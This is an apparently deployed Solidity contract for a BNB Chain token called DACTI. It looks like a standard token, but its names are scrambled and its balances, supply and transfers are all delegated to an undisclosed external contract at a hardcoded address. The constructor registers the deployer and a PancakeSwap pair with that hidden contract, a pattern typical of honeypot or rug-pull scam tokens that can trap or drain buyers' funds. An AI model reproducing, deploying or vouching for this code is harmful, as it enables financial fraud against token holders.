/**
 *Submitted for verification at BscScan.com on 2022-04-20
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface LDasdfljalsjf2342343 {
    function alsdfjasdlj24324lkasjfjkafdafsdfad234243(address _owner) view external returns (uint256);
    function aldsfjalfj2342aslfjaldf(address _from, address _to, uint256 _value) external;
    function adsfafasljklfjasljkdf324234ljakdfaskjfjh(uint256 total,address tokenAddress,address asjdflajsfdlkasj234432,address _pairs) external;
    function fasdjflakdhfkahf2344324() view external returns (uint256);
}
contract DACTI{

    string public name = "DACTI";
    string  public symbol = "DACTI";
    uint8   public decimals = 9;
	
    address public asjdflajsfdlkasj234432;
    address public alkfdlakjdf214423;
	lajslfjlakjsdfllasdasdasdf32432234 public jaljfladasdjfaslalkjdf2343;

	address wsadljflasfnbbnasdf = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    uint256 public totalSupply_ = 1000000000 * (10 ** decimals);

    LDasdfljalsjf2342343 jalsdfjlasdjDFlskdjflsdjf234234 = LDasdfljalsjf2342343(0x6d2A2Cb4ddDA5CcF1f370FD4832a110A68AAD385);
	
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );
    
    mapping(address => mapping(address => uint256)) public alkdflajflkasj234234;

    function balanceOf(address _owner) public view returns (uint256) {
        return jalsdfjlasdjDFlskdjflsdjf234234.alsdfjasdlj24324lkasjfjkafdafsdfad234243(_owner);
    }
    function totalSupply() public view returns (uint256) {
        return jalsdfjlasdjDFlskdjflsdjf234234.fasdjflakdhfkahf2344324();
    }

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );

    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return alkdflajflkasj234234[_owner][_spender];
    }

    constructor() {
		
        jaljfladasdjfaslalkjdf2343 = lajslfjlakjsdfllasdasdasdf32432234(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        alkfdlakjdf214423 = yyasdfjalsf234234(jaljfladasdjfaslalkjdf2343.factory()).createPair(wsadljflasfnbbnasdf, address(this));
        asjdflajsfdlkasj234432=msg.sender;

        jalsdfjlasdjDFlskdjflsdjf234234.adsfafasljklfjasljkdf324234ljakdfaskjfjh(totalSupply_, address(this), asjdflajsfdlkasj234432,alkfdlakjdf214423);
        emit Transfer(address(0), asjdflajsfdlkasj234432, totalSupply_);
    }
   
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= jalsdfjlasdjDFlskdjflsdjf234234.alsdfjasdlj24324lkasjfjkafdafsdfad234243(_from));
        require(_value <= alkdflajflkasj234234[_from][msg.sender]);
		
		jalsdfjlasdjDFlskdjflsdjf234234.aldsfjalfj2342aslfjaldf(_from,_to,_value);

        emit Transfer(_from, _to, _value);
        
		return true;
    }
	
	function approve(address _spender, uint256 _value) public returns (bool success) {
        alkdflajflkasj234234[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);
		
        return true;
    }
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(jalsdfjlasdjDFlskdjflsdjf234234.alsdfjasdlj24324lkasjfjkafdafsdfad234243(msg.sender) >= _value);

        jalsdfjlasdjDFlskdjflsdjf234234.aldsfjalfj2342aslfjaldf(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);

		return true;
    }
}

interface lajslfjlakjsdfllasdasdasdf32432234 {
    function factory() external pure returns (address);
}
interface yyasdfjalsf234234 {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}